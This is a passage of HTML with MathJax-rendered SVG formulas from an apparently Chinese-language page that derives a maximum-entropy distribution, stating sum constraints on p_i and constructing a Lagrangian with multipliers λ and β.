287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(6618.6,0) translate(0 -0.5)\"><path data-c=\"29\" d=\"M33 1741Q33 1750 51 1750H60H65Q73 1750 81 1743T119 1700Q554 1207 554 251Q554 -707 119 -1199Q76 -1250 66 -1250Q65 -1250 62 -1250T56 -1249Q55 -1249 53 -1249T49 -1250Q33 -1250 33 -1239Q33 -1236 50 -1214T98 -1150T163 -1052T238 -910T311 -727Q443 -335 443 251Q443 402 436 532T405 831T339 1142T224 1438T50 1716Q33 1737 33 1741Z\"/></g></g></g></g></svg></mjx-container></span> 约束：</p>\n<ul>\n<li><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.663ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"9.532ex\" height=\"2.36ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 4213.1 1043.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"munder\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1089,-285.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(1549.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(2657.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(3713.1,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></svg></mjx-container></span></li>\n<li><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.663ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"11.566ex\" height=\"2.36ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 5112.1 1043.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"munder\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1089,-285.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(1549.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(2379.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(3453.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4509.1,0)\"><path data-c=\"1D707\" d=\"M58 -216Q44 -216 34 -208T23 -186Q23 -176 96 116T173 414Q186 442 219 442Q231 441 239 435T249 423T251 413Q251 401 220 279T187 142Q185 131 185 107V99Q185 26 252 26Q261 26 270 27T287 31T302 38T315 45T327 55T338 65T348 77T356 88T365 100L372 110L408 253Q444 395 448 404Q461 431 491 431Q504 431 512 424T523 412T525 402L449 84Q448 79 448 68Q448 43 455 35T476 26Q485 27 496 35Q517 55 537 131Q543 151 547 152Q549 153 557 153H561Q580 153 580 144Q580 138 575 117T555 63T523 13Q510 0 491 -8Q483 -10 467 -10Q446 -10 429 -4T402 11T385 29T376 44T374 51L368 45Q362 39 350 30T324 12T288 -4T246 -11Q199 -11 153 12L129 -85Q108 -167 104 -180T92 -202Q76 -216 58 -216Z\"/></g></g></g></svg></mjx-container></span></li>\n</ul>\n<p>构造拉格朗日函数： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.827ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"62.194ex\" height=\"6.785ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1749.5 27489.8 2999\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"4C\" d=\"M62 -22T47 -22T32 -11Q32 -1 56 24T83 55Q113 96 138 172T180 320T234 473T323 609Q364 649 419 677T531 705Q559 705 578 696T604 671T615 645T618 623V611Q618 582 615 571T598 548Q581 531 558 520T518 509Q503 509 503 520Q503 523 505 536T507 560Q507 590 494 610T452 630Q423 630 410 617Q367 578 333 492T271 301T233 170Q211 123 204 112L198 103L224 102Q281 102 369 79T509 52H523Q535 64 544 87T579 128Q616 152 641 152Q656 152 656 142Q656 101 588 40T433 -22Q381 -22 289 1T156 28L141 29L131 20Q111 0 87 -11Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(690,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1079,0)\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1582,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2026.7,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2609.7,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3054.3,0)\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 65T257 -10Q227 -10 203 -2T165 17T143 40T131 59T126 65L62 -188Q60 -194 42 -194H29ZM353 431Q392 431 427 419L432 422Q436 426 439 429T449 439T461 453T472 471T484 495T493 524T501 560Q503 569 503 593Q503 611 502 616Q487 667 426 667Q384 667 347 643T286 582T247 514T224 455Q219 439 186 308T152 168Q151 163 151 147Q151 99 173 68Q204 26 260 26Q302 26 349 51T425 137Q441 171 449 214T457 279Q457 337 422 372Q380 358 347 358H337Q258 358 258 389Q258 396 261 403Q275 431 353 431Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3620.3,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4287.1,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5342.9,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"munder\" transform=\"translate(6287.6,0)\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(600,-1084.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(7898.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mi\" transform=\"translate(8894.8,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(10172.8,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"msub\" transform=\"translate(10339.5,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(11391.7,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(12391.9,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mrow\" transform=\"translate(13141.6,0)\"><g data-mml-node=\"mo\" transform=\"translate(0 -0.5)\"><path data-c=\"28\" d=\"M758 -1237T758 -1240T752 -1249H736Q718 -1249 717 -1248Q711 -1245 672 -1199Q237 -706 237 251T672 1700Q697 1730 716 1749Q718 1750 735 1750H752Q758 1744 758 1741Q758 1737 740 1713T689 1644T619 1537T540 1380T463 1176Q348 802 348 251Q348 -242 441 -599T744 -1218Q758 -1237 758 -1240Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(792,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1514.2,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"munder\" transform=\"translate(2514.4,0)\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(600,-1084.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(4125.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(4955.1,0) translate(0 -0.5)\"><path data-c=\"29\" d=\"M33 1741Q33 1750 51 1750H60H65Q73 1750 81 1743T119 1700Q554 1207 554 251Q554 -707 119 -1199Q76 -1250 66 -1250Q65 -1250 62 -1250T56 -1249Q55 -1249 53 -1249T49 -1250Q33 -1250 33 -1239Q33 -1236 50 -1214T98 -1150T163 -1052T238 -910T311 -727Q443 -335 443 251Q443 402 436 532T405 831T339 1142T224 1438T50 1716Q33 1737 33 1741Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(19110.9,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(20111.1,0)\"><path data-c=\"1D6FD\" d=\"M29 -194Q23 -188 23 -186Q23 -183 102 134T186 465Q208 533 243 584T309 658Q365 705 429 705H431Q493 705 533 667T573 570Q573 465 469 396L482 383Q533 332 533 252Q533 139 448 